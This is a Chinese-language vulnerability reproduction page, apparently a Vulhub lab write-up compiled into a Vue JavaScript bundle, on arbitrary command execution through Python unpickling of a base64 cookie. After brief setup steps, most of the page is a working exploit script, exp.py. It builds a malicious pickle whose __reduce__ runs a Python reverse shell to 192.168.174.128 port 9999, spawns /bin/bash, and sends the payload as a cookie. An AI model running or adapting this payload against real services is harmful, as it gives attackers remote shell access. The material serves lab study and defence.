import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o as c,c as i,a as n,b as s,d as a,e as t}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"参考阅读：",-1),d={href:"http://rickgray.me/2015/09/12/django-command-execution-analysis.html",target:"_blank",rel:"noopener noreferrer"},k={href:"https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html",target:"_blank",rel:"noopener noreferrer"},m=t(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 编译及运行测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>访问 <code>http://your-ip:8000</code>，显示 <code>Hello {username}!</code>。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>username 是取 Cookie 变量 user，对其进行 base64 解码 + 反序列化后还原的对象中的“username”变量，默认为“Guest”，伪代码：<code>pickle_decode(base64_decode(cookie[&#39;user&#39;]))[&#39;username&#39;] or &#39;Guest&#39;</code>。</p>`,6),h={href:"http://exp.py",target:"_blank",rel:"noopener noreferrer"},v=t(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> os
<span class="token keyword">import</span> base64


<span class="token keyword">class</span> <span class="token class-name">exp</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.174.128&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;&quot;&quot;&quot;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


e <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span>

response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;http://192.168.174.128:8000/&quot;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>
    user<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281725409.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,2);function b(_,g){const e=p("ExternalLinkIcon");return c(),i("div",null,[u,r,n("ul",null,[n("li",null,[n("a",d,[s("http://rickgray.me/2015/09/12/django-command-execution-analysis.html"),a(e)])]),n("li",null,[n("a",k,[s("https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html"),a(e)])])]),m,n("p",null,[s("调用 "),n("a",h,[s("exp.py"),a(e)]),s("，监听 9999 端口，反弹 shell：")]),v])}const x=o(l,[["render",b],["__file","Python unpickle 造成任意命令执行漏洞.html.vue"]]);export{x as default};
